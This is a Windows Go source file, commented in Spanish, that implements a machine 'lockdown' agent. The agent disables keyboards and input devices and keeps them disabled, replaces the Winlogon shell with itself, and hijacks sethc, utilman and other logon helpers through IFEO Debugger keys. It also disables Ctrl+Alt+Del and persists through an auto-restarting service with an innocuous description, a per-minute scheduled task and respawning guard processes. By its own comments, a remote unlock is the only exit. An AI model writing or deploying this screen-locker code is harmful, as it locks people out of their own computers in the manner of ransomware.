//go:build windows

package win32

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"

	"github.com/local/govoid/internal/config"
)

const (
	winlogonKeyPath  = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
	ifeoKeyPath      = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
	systemPolicyPath = `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
)

// Nombres de respaldo en el registro. Llevan el ProductID para que dos builds
// distintos no se pisen al desinstalarse.
var (
	shellBackupValue = config.ShellBackupValue
	ifeoBackupValue  = config.DebuggerBackupValue
)

// policyLocks son las dos políticas que hacen visible Ctrl+Alt+Del. Con el
// teclado deshabilitado no llegan a ejecutarse, pero si algo rehabilita el
// dispositivo antes de tiempo, esto quita la pantalla de SAS y el Win+L.
var policyLocks = []string{"DisableCAD", "DisableLockWorkstation"}

// logonHelpers son los binarios que se pueden lanzar desde la pantalla de
// inicio de sesión. Cada uno es una puerta conocida: sethc.exe (Mayús x5) da
// un cmd como SYSTEM, utilman.exe (Win+U) igual, y el resto sirve para lo
// mismo. Se les pone un Debugger que apunta a nuestro binario en modo noop:
// al lanzarse, arrancan el agente, que sale sin hacer nada.
var logonHelpers = []string{
	"sethc.exe",
	"utilman.exe",
	"osk.exe",
	"narrator.exe",
	"magnify.exe",
	"AtBroker.exe",
	"DisplaySwitch.exe",
}

var maintenanceOnce sync.Once

// LockDown deja la máquina bloqueada y sin salida local. Es idempotente.
//
// exe tiene que ser una ruta estable —la copia en System32 o la instalada— no
// el binario temporal desde el que se lanzó el agente.
func LockDown(exe string) error {
	if err := RequestLock(); err != nil {
		return err
	}
	return EnforceLock(exe)
}

// EnforceLock aplica todas las capas sin tocar la bandera. Se llama al
// bloquear y otra vez en cada arranque del agente, por si el reinicio se llevó
// alguna capa por delante.
func EnforceLock(exe string) error {
	if !LockRequested() {
		return nil
	}

	var errs []error

	_ = writeAgentPath(exe)

	// Primero el hardware: sin teclado no hay Ctrl+Alt+Del posible. Todo lo
	// demás es cosmético hasta que el kernel deja de recibir scancodes.
	disableInputDevices()

	if err := DefaultLock.Start(0); err != nil && !errors.Is(err, ErrLocked) {
		errs = append(errs, fmt.Errorf("cortina: %w", err))
	}

	if err := installShieldService(exe); err != nil {
		errs = append(errs, fmt.Errorf("servicio: %w", err))
	}
	if err := ensureGuardTask(exe); err != nil {
		errs = append(errs, fmt.Errorf("tarea centinela: %w", err))
	}

	SpawnGuards(exe)
	startMaintenance(exe)

	if err := hardenLogonPaths(exe); err != nil {
		errs = append(errs, fmt.Errorf("rutas de inicio: %w", err))
	}
	if err := swapWinlogonShell(exe); err != nil {
		errs = append(errs, fmt.Errorf("shell de winlogon: %w", err))
	}
	if err := hardenPolicies(); err != nil {
		errs = append(errs, fmt.Errorf("políticas: %w", err))
	}

	return errors.Join(errs...)
}

// startMaintenance repone centinelas cada dos segundos mientras la bandera
// exista. También vuelve a apagar cualquier teclado que se haya reconectado:
// un USB nuevo es un dispositivo nuevo, y Windows lo arranca habilitado.
func startMaintenance(exe string) {
	maintenanceOnce.Do(func() {
		go func() {
			ticker := time.NewTicker(2 * time.Second)
			defer ticker.Stop()
			for range ticker.C {
				if !LockRequested() {
					if inputDisabled.Load() {
						enableInputDevices()
					}
					continue
				}
				SpawnGuards(exe)
				disableInputDevices()
			}
		}()
	})
}

// UnlockAll revierte todo. Es la única salida: no hay temporizador, ni tecla,
// ni combinación que levante el candado.
func UnlockAll() error {
	_ = RequestUnlock()
	DefaultLock.Stop()

	var errs []error

	// El hardware vuelve primero: si algo falla después, al menos hay teclado.
	enableInputDevices()

	if err := removeShieldService(); err != nil {
		errs = append(errs, fmt.Errorf("servicio: %w", err))
	}
	_ = runHidden("schtasks.exe", "/delete", "/tn", shieldGuardTask, "/f")

	// Los centinelas ven la bandera borrada en su siguiente tick (500 ms).
	deadline := time.Now().Add(5 * time.Second)
	for guardsAlive() > 0 && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
	}

	if err := restoreLogonPaths(); err != nil {
		errs = append(errs, fmt.Errorf("rutas de inicio: %w", err))
	}
	if err := restoreWinlogonShell(); err != nil {
		errs = append(errs, fmt.Errorf("shell de winlogon: %w", err))
	}
	if err := restorePolicies(); err != nil {
		errs = append(errs, fmt.Errorf("políticas: %w", err))
	}
	if err := removeGuardCopies(); err != nil {
		errs = append(errs, fmt.Errorf("copias: %w", err))
	}
	_ = os.Remove(agentPathFile())

	return errors.Join(errs...)
}

// --- servicio ---

func installShieldService(exe string) error {
	binPath := `"` + exe + `" --service`
	var errs []error

	if err := runHidden("sc.exe", "create", shieldServiceName,
		"binPath=", binPath,
		"type=", "own",
		"start=", "auto",
		"DisplayName=", config.ServiceDisplayName); err != nil {
		// Ya existía: se reconfigura la ruta y el arranque.
		if cfgErr := runHidden("sc.exe", "config", shieldServiceName,
			"binPath=", binPath, "start=", "auto"); cfgErr != nil {
			errs = append(errs, fmt.Errorf("config: %w", cfgErr))
		}
	}

	_ = runHidden("sc.exe", "description", shieldServiceName,
		"Mantiene el estado de seguridad de la sesión interactiva.")
	// Reinicio inmediato en caso de caída: SCM lo relanza sin espera.
	_ = runHidden("sc.exe", "failure", shieldServiceName,
		"reset=", "0", "actions=", "restart/0/restart/0/restart/0")

	// 1056 = ya está en marcha. Cualquier otro error sí importa.
	if err := runHidden("sc.exe", "start", shieldServiceName); err != nil {
		if !strings.Contains(err.Error(), "1056") {
			errs = append(errs, fmt.Errorf("start: %w", err))
		}
	}

	return errors.Join(errs...)
}

func removeShieldService() error {
	_ = runHidden("sc.exe", "stop", shieldServiceName)
	time.Sleep(300 * time.Millisecond)
	if err := runHidden("sc.exe", "delete", shieldServiceName); err != nil {
		// 1060 = el servicio no existe: nada que borrar.
		if !strings.Contains(err.Error(), "1060") {
			return err
		}
	}
	return nil
}

// ensureGuardTask registra una tarea que relanza el agente cada minuto. Es la
// última red: si el servicio y los cuatro centinelas caen a la vez, la tarea
// los devuelve a la vida.
func ensureGuardTask(exe string) error {
	_ = runHidden("schtasks.exe", "/delete", "/tn", shieldGuardTask, "/f")
	return runHidden("schtasks.exe", "/create",
		"/tn", shieldGuardTask,
		"/tr", `"`+exe+`"`,
		"/sc", "MINUTE",
		"/mo", "1",
		"/rl", "HIGHEST",
		"/f")
}

// --- rutas de inicio de sesión ---

func hardenLogonPaths(exe string) error {
	debugger := `"` + exe + `" --noop`
	var errs []error

	for _, name := range logonHelpers {
		path := ifeoKeyPath + `\` + name
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, path,
			registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			created, _, createErr := registry.CreateKey(registry.LOCAL_MACHINE, path,
				registry.SET_VALUE|registry.QUERY_VALUE)
			if createErr != nil {
				errs = append(errs, fmt.Errorf("%s: %w", name, createErr))
				continue
			}
			key = created
		}

		// Guardar el Debugger previo una sola vez: si ya había uno, se
		// restaura tal cual al levantar el candado.
		if _, _, backupErr := key.GetStringValue(ifeoBackupValue); backupErr != nil {
			previous, _, prevErr := key.GetStringValue("Debugger")
			if prevErr != nil {
				previous = ""
			}
			_ = key.SetStringValue(ifeoBackupValue, previous)
		}

		if setErr := key.SetStringValue("Debugger", debugger); setErr != nil {
			errs = append(errs, fmt.Errorf("%s: %w", name, setErr))
		}
		_ = key.Close()
	}

	return errors.Join(errs...)
}

func restoreLogonPaths() error {
	var errs []error

	for _, name := range logonHelpers {
		path := ifeoKeyPath + `\` + name
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, path,
			registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		previous, _, backupErr := key.GetStringValue(ifeoBackupValue)
		if backupErr == nil && previous != "" {
			if setErr := key.SetStringValue("Debugger", previous); setErr != nil {
				errs = append(errs, fmt.Errorf("%s: %w", name, setErr))
			}
		} else if delErr := key.DeleteValue("Debugger"); delErr != nil &&
			!errors.Is(delErr, registry.ErrNotExist) {
			errs = append(errs, fmt.Errorf("%s: %w", name, delErr))
		}

		if delErr := key.DeleteValue(ifeoBackupValue); delErr != nil &&
			!errors.Is(delErr, registry.ErrNotExist) {
			errs = append(errs, fmt.Errorf("%s backup: %w", name, delErr))
		}
		_ = key.Close()
	}

	return errors.Join(errs...)
}

// --- shell de Winlogon ---

// swapWinlogonShell hace que el agente sea el shell del usuario. En el
// siguiente inicio de sesión no arranca explorer.exe: arranca el agente, que
// levanta la cortina antes de que exista escritorio.
func swapWinlogonShell(exe string) error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath,
		registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	defer func() { _ = key.Close() }()

	if _, _, backupErr := key.GetStringValue(shellBackupValue); backupErr != nil {
		original, _, originalErr := key.GetStringValue("Shell")
		if originalErr != nil || strings.TrimSpace(original) == "" {
			original = "explorer.exe"
		}
		if setErr := key.SetStringValue(shellBackupValue, original); setErr != nil {
			return setErr
		}
	}

	return key.SetStringValue("Shell", `"`+exe+`"`)
}

func restoreWinlogonShell() error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath,
		registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return nil // sin permisos nunca se escribió nada
	}
	defer func() { _ = key.Close() }()

	// Sin respaldo no se tocó nada: devolver nil en vez de pisar un Shell
	// personalizado con explorer.exe.
	original, _, backupErr := key.GetStringValue(shellBackupValue)
	if backupErr != nil {
		return nil
	}
	_ = key.DeleteValue(shellBackupValue)
	if strings.TrimSpace(original) == "" {
		original = "explorer.exe"
	}

	return key.SetStringValue("Shell", original)
}

// --- políticas del sistema ---

// hardenPolicies pone DisableCAD y DisableLockWorkstation. Con el teclado
// apagado no llegan a usarse, pero son la segunda línea si el dispositivo
// vuelve antes de tiempo.
func hardenPolicies() error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, systemPolicyPath,
		registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		created, _, createErr := registry.CreateKey(registry.LOCAL_MACHINE, systemPolicyPath,
			registry.SET_VALUE|registry.QUERY_VALUE)
		if createErr != nil {
			return createErr
		}
		key = created
	}
	defer func() { _ = key.Close() }()

	var errs []error
	for _, name := range policyLocks {
		backup := config.PolicyBackupPrefix + name
		marker := config.PolicyMarkerPrefix + name

		// El respaldo se escribe una sola vez: si se reescribe en cada
		// arranque, se guarda el valor ya modificado y no se puede restaurar.
		if _, _, markerErr := key.GetIntegerValue(marker); markerErr != nil {
			if previous, _, valueErr := key.GetIntegerValue(name); valueErr != nil {
				_ = key.SetDWordValue(marker, 0)
			} else {
				_ = key.SetDWordValue(backup, uint32(previous))
				_ = key.SetDWordValue(marker, 1)
			}
		}

		if setErr := key.SetDWordValue(name, 1); setErr != nil {
			errs = append(errs, fmt.Errorf("%s: %w", name, setErr))
		}
	}
	return errors.Join(errs...)
}

func restorePolicies() error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, systemPolicyPath,
		registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return nil
	}
	defer func() { _ = key.Close() }()

	var errs []error
	for _, name := range policyLocks {
		backup := config.PolicyBackupPrefix + name
		marker := config.PolicyMarkerPrefix + name

		had, _, markerErr := key.GetIntegerValue(marker)
		if markerErr != nil {
			continue // nunca se tocó
		}

		if had == 1 {
			if previous, _, valueErr := key.GetIntegerValue(backup); valueErr == nil {
				if setErr := key.SetDWordValue(name, uint32(previous)); setErr != nil {
					errs = append(errs, fmt.Errorf("%s: %w", name, setErr))
				}
			}
		} else if delErr := key.DeleteValue(name); delErr != nil &&
			!errors.Is(delErr, registry.ErrNotExist) {
			errs = append(errs, fmt.Errorf("%s: %w", name, delErr))
		}

		_ = key.DeleteValue(backup)
		_ = key.DeleteValue(marker)
	}
	return errors.Join(errs...)
}

// --- utilidades ---

func runHidden(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindowFlag,
	}
	return cmd.Run()
}

// ShieldExe elige el binario estable para servicio y shell: la copia en
// System32 si existe, y si no la instalada.
func ShieldExe(installPath, systemPath string) string {
	if _, err := os.Stat(systemPath); err == nil {
		return systemPath
	}
	if _, err := os.Stat(installPath); err == nil {
		return installPath
	}
	return filepath.Clean(installPath)
}
